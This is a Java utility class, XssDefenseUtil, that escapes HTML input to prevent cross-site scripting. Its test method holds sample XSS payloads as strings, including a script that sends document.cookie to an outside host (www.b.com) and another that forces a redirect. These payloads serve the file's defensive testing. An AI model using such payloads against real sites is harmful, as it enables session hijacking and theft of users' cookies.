/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.creditcloud.common.utils;

import org.apache.commons.lang3.StringEscapeUtils;

/**
 *
 * @author admin
 */
public class XssDefenseUtil {

    /**
     * 预防xss攻击对输入字符串转义
     *
     * @param inputString 输入字符串
     * @return 转义后的字符串
     */
    public static String escapeHtml(String inputString) {
        if (null != inputString && !"".equals(inputString)) { // && inputString.contains("<script")
            return StringEscapeUtils.escapeHtml4(inputString);// 汉字会转换成对应的ASCII码，空格不转换
        }
        return inputString;
    }

    public static void main(String[] args) {
        String inputString = "<script>测试中文window.location.href=\"http://www.baidu.com\";</script>";
        //利用第三方包处理的
        System.out.println(XssDefenseUtil.escapeHtml(inputString));
        inputString = "测试中文<</span></&";
        System.out.println(XssDefenseUtil.htmlEncode(inputString));
        //另一种自定义处理方式
        inputString = "测试中文<script>window.open(\"www.b.com?param=\"+document.cookie)</script>";
        System.out.println(XssDefenseUtil.htmlEncode(inputString));
    }

    private static String htmlEncode(char c) {

        switch (c) {

            case '&':

                return "&amp;";

            case '<':

                return "&lt;";

            case '>':

                return "&gt;";

            case '"':

                return "&quot;";

            case ' ':

                return "&nbsp;";

            default:

                return c + "";

        }

    }

    /**
     * 对传入的字符串str进行Html encode转换
     */
    public static String htmlEncode(String str) {
        if (str == null || str.trim().equals("")) {
            return str;
        }

        StringBuilder encodeStrBuilder = new StringBuilder();
        for (int i = 0, len = str.length(); i < len; i++) {
            encodeStrBuilder.append(htmlEncode(str.charAt(i)));
        }

        return encodeStrBuilder.toString();

    }

}
